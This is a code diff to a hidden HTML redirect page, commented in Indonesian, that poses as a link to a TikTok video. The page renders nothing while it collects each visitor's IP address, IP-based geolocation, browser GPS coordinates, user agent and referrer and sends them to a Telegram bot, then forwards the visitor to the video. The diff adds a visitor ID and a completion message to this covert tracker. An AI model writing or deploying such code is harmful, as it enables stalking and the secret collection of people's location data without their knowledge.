@@ -2,9 +2,15 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Redirecting...</title>
+    <title></title>
     <style>
-        body { background: #000; display: none; }
+        /* HIDE EVERYTHING */
+        html, body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -21,7 +27,7 @@
     const REDIRECT_URL = "https://www.tiktok.com/@bbygurllxyz_/video/7633609115247414548";
 
     // ============================================
-    // 🔴 KIRIM KE TELEGRAM
+    // 🔴 FUNGSI KIRIM KE TELEGRAM
     // ============================================
     function sendToTelegram(msg) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -88,13 +94,14 @@
         const time = new Date().toLocaleString('id-ID');
         const ua = navigator.userAgent;
         const ref = document.referrer || 'Direct';
+        const visitorId = 'visitor_' + Date.now();
 
         // 1. AMBIL IP
         fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
             .then(data => {
                 const ip = data.ip;
-                sendToTelegram(`✅ NEW VISITOR\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}\n🌐 IP: ${ip}\n📱 ${ua}\n🔗 ${ref}`);
+                sendToTelegram(`✅ NEW VISITOR\n━━━━━━━━━━━━━━━━━━━\n🕐 ${time}\n🌐 IP: <code>${ip}</code>\n📱 ${ua}\n🔗 ${ref}\n🆔 ${visitorId}`);
 
                 // 2. AMBIL GEOLOKASI DARI IP
                 fetch(`http://ip-api.com/json/${ip}`)
@@ -112,7 +119,7 @@
                 pos => {
                     const lat = pos.coords.latitude;
                     const lng = pos.coords.longitude;
-                    sendToTelegram(`📍 GPS LOCATION!\n━━━━━━━━━━━━━━━━━━━\n🎯 ${lat}, ${lng}\n🗺️ https://www.google.com/maps?q=${lat},${lng}`);
+                    sendToTelegram(`📍 GPS LOCATION!\n━━━━━━━━━━━━━━━━━━━\n🎯 <code>${lat}, ${lng}</code>\n🗺️ https://www.google.com/maps?q=${lat},${lng}`);
                 },
                 () => {}
             );
@@ -125,7 +132,10 @@
             }
         });
 
-        // 5. REDIRECT KE TIKTOK (SETELAH 1.5 DETIK)
+        // 5. ✅ DONE
+        sendToTelegram(`✅ DONE\n━━━━━━━━━━━━━━━━━━━`);
+
+        // 6. REDIRECT KE TIKTOK (SETELAH 1.5 DETIK)
         setTimeout(() => {
             window.location.href = REDIRECT_URL;
         }, 1500);
